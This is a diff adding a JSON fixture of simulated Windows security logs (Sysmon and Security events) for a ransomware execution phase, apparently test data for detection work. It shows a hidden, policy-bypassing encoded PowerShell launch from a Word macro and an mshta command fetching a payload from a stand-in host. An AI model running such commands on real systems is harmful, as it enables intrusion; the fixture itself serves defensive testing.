@@ -1,0 +1,134 @@
+{
+  "_metadata": {
+    "engagement": "ransomware",
+    "phase": "execution",
+    "phase_number": 1,
+    "description": "Execution phase of Ransomware - example-corp",
+    "techniques": [
+      "T1059.001",
+      "T1218.005"
+    ],
+    "timespan": "T+0:19:00 to T+0:22:00",
+    "attacker_logic": "Attacker executes execution techniques",
+    "format": "wazuh-native",
+    "format_version": "2.0"
+  },
+  "attacker_profile": {
+    "c2_server": "185.141.27.98",
+    "initial_target": "WS01.corp.local",
+    "compromised_user": "CORP\\jsmith"
+  },
+  "logs": [
+    {
+      "_comment": "PowerShell execution from Office macro (Sysmon)",
+      "sequence": 1,
+      "relative_time": "T+0:19:00",
+      "timestamp": "2026-01-30T08:19:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:40:28.881",
+            "ProcessGuid": "{C257A465-WS01-0007-F2321B2F4E1C}",
+            "ProcessId": "1764",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
+            "CurrentDirectory": "C:\\Users\\Public\\",
+            "User": "EXAMPLE\\mjones",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "ParentProcessGuid": "{C257A465-WS01-0006-9151E68DDFCD}",
+            "ParentProcessId": "1643",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\mjones\\Downloads\\Invoice.docm\""
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:19:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "execution"
+      }
+    },
+    {
+      "_comment": "PowerShell execution from Office macro (Security)",
+      "sequence": 2,
+      "relative_time": "T+0:20:00",
+      "timestamp": "2026-01-30T08:20:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "SubjectUserName": "mjones",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x6E4",
+            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x66B",
+            "CommandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "TargetUserName": "mjones",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:20:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "execution"
+      }
+    },
+    {
+      "_comment": "MSHTA execution (LOLBin)",
+      "sequence": 3,
+      "relative_time": "T+0:21:30",
+      "timestamp": "2026-01-30T08:21:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:40:51.007",
+            "ProcessGuid": "{C257A465-WS01-0011-DFFA039158CB}",
+            "ProcessId": "2137",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "CommandLine": "mshta http://update-cdn.example.com/payload.hta",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "Medium",
+            "ParentProcessGuid": "{C257A465-WS01-0010-49ECBB711821}",
+            "ParentProcessId": "2055",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:21:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "execution"
+      }
+    }
+  ]
+}
